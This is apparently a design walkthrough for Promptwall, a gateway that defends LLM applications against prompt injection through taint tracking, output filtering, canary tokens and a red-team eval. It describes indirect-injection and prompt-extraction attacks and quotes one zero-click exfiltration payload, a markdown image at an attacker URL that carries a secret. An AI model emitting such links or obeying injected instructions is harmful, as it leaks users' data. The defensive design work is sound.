# Promptwall walkthrough: design decisions

## Why a gateway, not "a better prompt"?
System prompts are instructions to the same model the attacker is talking to, so they can be argued with. A gateway is code outside the model: it can't be persuaded. Promptwall treats the model like any other untrusted component, inspecting what goes in and what comes out and deciding what actually happens.

## Why evaluate against a *compromised* model?
Real models get better or worse at resisting injection from release to release. If the eval used a real model, a good score might just mean the model refused on its own. The eval simulates a model that **always obeys the attacker**, so every attack would land without a gateway (23/23), and whatever still lands *with* Promptwall is a gap in Promptwall. It's the same method as Patchwarden's red team: measure the guardrails, not the model.

## Why cheap signature rules first?
- **Latency:** sub-millisecond, versus 100+ ms for a model-based classifier on every request.
- **Explainability:** every block names the rule and the matched text, which matters for incident review and for tuning false positives.
- **Honest limits:** the corpus includes three attacks rules can't catch, and they land. The roadmap adds a semantic layer only for uncertain cases, so cost stays low.

## The two ideas that matter most

### 1. Taint tracking for tools
Once untrusted content (a retrieved doc, an email, a web page) is in the context, any **side-effecting** tool call needs human approval, even to an allowed recipient. That means a poisoned document that slips past detection still can't make the assistant *act*. (`indirect-tainted-email-clean-domain`: email to an internal address, with legitimate-looking content, still held for approval.)

### 2. Output handling closes zero-click exfiltration
The well-known attack: a poisoned page tells the model to write `![](https://attacker/?d=<secret>)`. The chat UI renders the image and the browser leaks the secret in the URL, with no click needed. Promptwall strips images and links to domains outside an allowlist before the app ever sees them.

## Other decisions
- **Canary instead of string matching on the prompt:** a random token per request. A verbatim leak of the system prompt always includes it, so detection is exact, with zero false positives on normal text.
- **Inbound redaction:** data minimization. The model doesn't need a customer's SSN to answer "where's my order?", so it never receives it.
- **Luhn check on card numbers:** without it, order numbers and phone numbers trip the card detector; with it, the benign suite stays at 0 false positives.
- **Fail closed:** if a guard or the model backend throws, the request is blocked. A security layer that fails open on errors is easy to bypass: just cause an error.
- **Audit without bodies:** the log records decisions and findings, not prompts or responses, so it doesn't become a second copy of everyone's PII.

## Be ready to answer
- *"Regex for prompt injection? Attackers will just rephrase."* Yes, and the eval shows it (3 known gaps). That's why authority is enforced separately: tool policy, taint and output handling don't depend on detecting the attack. Detection reduces noise; deterministic sinks prevent damage.
- *"What's the latency cost?"* p50 under 0.1 ms for the gateway itself; the model call dominates.
- *"How would you deploy it?"* As a sidecar or reverse proxy in front of the model API, one policy file per route, the audit log shipped to the SIEM, and the eval suite as a CI gate on every policy change.
- *"How does this relate to Patchwarden?"* Patchwarden *uses* an LLM inside a security pipeline and keeps it from being manipulated. Promptwall *protects* LLM features in production. Same principle in both: the model recommends; deterministic code decides.
